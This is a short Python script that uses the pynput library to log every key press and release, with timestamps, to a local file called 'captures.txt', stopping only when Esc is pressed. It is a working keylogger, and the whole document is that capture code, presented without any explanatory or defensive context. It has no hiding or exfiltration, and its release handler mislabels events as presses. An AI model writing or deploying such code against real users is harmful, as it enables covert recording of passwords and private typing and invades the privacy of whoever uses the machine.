from pynput import keyboard
import logging



#Location of where the log will be stored
log_file="captures.txt"

#Logging Configuration
logging.basicConfig(filename=log_file,level=logging.DEBUG,format='%(asctime)s:%(message)s')


def KeyPress(key):
    try:
        logging.info(f"Key pressed: {key.char}\n")


    except AttributeError :
        logging.info(f"Key pressed: {key}\n")
        
def KeyRelease(key):

   logging.info(f"Key pressed:{key}\n")
   if key == keyboard.Key.esc:
       return False

def KeyListener():

    with keyboard.Listener(on_press=KeyPress, on_release=KeyRelease) as listener:
        listener.join()
    

if __name__=='__main__':
    KeyListener()

